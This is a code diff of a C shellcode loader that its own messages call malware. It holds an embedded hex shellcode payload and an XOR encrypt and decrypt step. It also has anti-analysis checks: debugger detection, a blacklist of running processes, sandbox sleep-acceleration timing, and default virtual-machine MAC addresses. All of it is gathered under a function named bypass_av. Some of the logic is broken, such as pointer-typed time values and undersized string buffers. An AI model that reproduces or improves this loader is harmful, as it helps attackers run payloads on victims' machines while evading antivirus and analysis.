@@ -8,13 +8,12 @@ void decrypt_shellcode(char* shellcode);
 void spam_nops();
 
 int enumarate_process();
-int check_process_running(TCHAR process_name);
-TCHAR GetProcessNameAndID(DWORD processID);
+int check_process_running(char* process_name);
 
 int check_sleep_acceleration();
 int get_current_time();
 
-char get_mac_address();
+void get_mac_address(char* final_mac_address);
 int checks_mac_address();
 //
 
@@ -59,6 +58,10 @@ char macs_blacklist[MACS_MAX][MACS_LENGTH_MAX] = {
 };
 
 
+unsigned char shell[] = {
+    0x52, 0x56
+    };
+
 unsigned char shellcode[] =
     "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
     "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
@@ -89,20 +92,26 @@ unsigned char shellcode[] =
 
 int bypass_av(){
     if ( IsDebuggerPresent() ){
+        printf("debugger found");
         return -1;
     }
 
-    if ( enumarate_process() == -1){
+    if ( enumerate_process() == -1){
+        printf("process found");
         return -1;
     }
 
     if ( check_sleep_acceleration() == -1 ){
+        printf("sleep found");
         return -1;
     }
 
     if ( checks_mac_address() == -1 ){
+        printf("mac found");
         return -1;
     }
+
+    // printf("error");
 
     return 0;
 
@@ -111,7 +120,7 @@ int bypass_av(){
 // Checks if any process in blacklist are running in the system
 
 
-int check_process_running(TCHAR process_name){
+int check_process_running(char* process_name){
     unsigned int x;
 
     for (x = 0; x < PROCESS_BLACKLIST_MAX; x++){
@@ -119,72 +128,42 @@ int check_process_running(TCHAR process_name){
             return -1;
         }
     }    
+
+    return 0;
 }
 
-TCHAR GetProcessNameAndID(DWORD processID){
-    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+int enumerate_process(){
+    FILE* fp;
+    char command[] = "tasklist";
+    char* process_name[48];
 
-    // Get a handle to the process.
-
-    HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
-                                   PROCESS_VM_READ,
-                                   FALSE, processID );
-
-    // Get the process name.
-
-    if (NULL != hProcess )
-    {
-        HMODULE hMod;
-        DWORD cbNeeded;
-
-        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
-        {
-            GetModuleBaseName( hProcess, hMod, szProcessName, 
-                               sizeof(szProcessName)/sizeof(TCHAR) );
-        }
-    }
-
-    // Print the process name and identifier.
-
-    _tprintf( TEXT("%s  (PID: %u)\n"), szProcessName, processID );
-
-    // Release the handle to the process.
-
-    CloseHandle( hProcess );    
-
-    return szProcessName;
-}
-
-
-int enumarate_process(){
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
-    unsigned int i,x;
-
-    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
-    {
+    fp = popen(command, "r"); // Executes the command
+    if (!fp){
         return 1;
     }
 
+    while(!feof(fp)){
+        
+        int result;
 
-    // Calculate how many process identifiers were returned.
+        fgets(process_name,sizeof(process_name),fp);
+        char* token = strtok(process_name, " "); // Split the string
 
-    cProcesses = cbNeeded / sizeof(DWORD);
+        strcpy(process_name,token); 
 
-    // Print the name and process identifier for each process.
+        // printf("%s\n",process_name);
 
-    for ( i = 0; i < cProcesses; i++ )
-    {
-        if( aProcesses[i] != 0 )
-        {
-            TCHAR process_name[MAX_PATH];
-            strcpy(process_name,GetProcessNameAndID( aProcesses[i] )); // Gets process name
-            if( check_process_running(process_name) == -1) { // Checks if the process are running in the system, if the return value is -1, returns false and closes the program.
-                return -1;
-            }
+        result = check_process_running(process_name); // Checks if the process are in the black-list
+        
+        if ( result != 0 ){
+            return -1;
         }
+
+        memset(process_name, 0x0, sizeof process_name); // Resets "process_name" variable
+        
     }
 
-    return 0;    
+    return 0;
 }
 
 
@@ -195,14 +174,14 @@ int enumarate_process(){
 // If a sandbox is running, the "Sleep" will be accelerated
 
 int check_sleep_acceleration(){
-    int first_time, second_time;
+    int* first_time, second_time;
 
     first_time = get_current_time();
-    Sleep(60000);
+    Sleep(120000); // Sleeps 2 minutes
 
     second_time = get_current_time();
 
-    if ( (first_time - second_time) < 60000){
+    if ( (first_time - second_time) < 2){
         return -1;
     }
 
@@ -226,38 +205,38 @@ int get_current_time(){
 // Checks if the mac address is the same as default VM's mac
 
 
-char get_mac_address(){
+void get_mac_address(char* final_mac_address){
     FILE* fp;
     char command[] = "getmac";
     char mac_address[17];
-    char final_mac_address[12];
+    // char final_mac_address[12];
 
     fp = popen(command, "r"); // Runs "getmac" command
     fgets(mac_address,sizeof(mac_address),fp); // Gets the command result
 
-    
+
     // Remove all :
 
     char * token = strtok(mac_address, ":");
 
     while ( token != NULL ){
-        strcat(final_mac_address,token); 
+        strcat(final_mac_address,token);
         token = strtok(NULL, ":");
     }
 
     ///
 
-    return final_mac_address;
+    return;
 }
 
 
 int checks_mac_address(){
     char mac_address[12];
-    strcpy(mac_address,get_mac_address());
+    get_mac_address(mac_address);
     int i;
 
     for ( i = 0; i < MACS_MAX; i++ ){
-        if ( strstr(mac_address,macs_blacklist[i]) != NULL ){
+        if ( strstr(mac_address,macs_blacklist[i]) != NULL ){ // Checks if the system mac address is same as the default vm mac
             return -1;
         }
     }
@@ -358,17 +337,23 @@ int main(){
 
     int result;
 
-    HWND hWnd = GetConsoleWindow();
-    ShowWindow(hWnd, SW_HIDE);
+    // HWND hWnd = GetConsoleWindow();
+    // ShowWindow(hWnd, SW_HIDE);
 
-    spam_nops();
+    // spam_nops();
 
 
-    xor_cipher(&shellcode); // Encrypts the shellcode
+    // xor_cipher(&shellcode); // Encrypts the shellcode
 
     if (bypass_av() != 0){
+        printf("AV detected");
         return 0;
+    } else {
+        printf("The malware will be executed");
+        // return 0;
     }
+
+    // return 0;
 
     xor_cipher(&shellcode); // Decrypts the shellcode
 
